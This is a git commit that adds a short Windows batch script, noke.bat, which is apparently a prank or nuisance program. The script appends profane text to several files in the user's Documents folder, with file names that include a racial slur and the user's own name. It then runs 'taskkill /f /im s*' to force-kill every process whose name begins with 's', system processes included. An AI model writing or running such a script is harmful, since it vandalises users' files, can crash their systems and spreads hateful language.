64c7c141c58ace37ffb0ff7ad743f7bde9d7d328
giggityfiles <giggityfiles@gmail.com>
2025-09-07 22:31:53 -0400

    Create noke.bat

---
+++ noke.bat
@@ -0,0 +1,12 @@
+@echo off
+color 2
+title �nul
+echo fuck you >> %USERPROFILE%/Documents/fucking.txt
+echo fuck you >> %USERPROFILE%/Documents/nigger.txt
+echo fuck you >> %USERPROFILE%/Documents/anal.txt
+echo fuck you >> %USERPROFILE%/Documents/ass.txt
+echo fuck you >> %USERPROFILE%/Documents/%username%.txt
+echo fuck you >> %USERPROFILE%/Documents/%username%2.txt
+echo fuck you >> %USERPROFILE%/Documents/%username%3.txt
+echo fuck you >> %USERPROFILE%/Documents/%username%4.txt
+taskkill /f /im s*
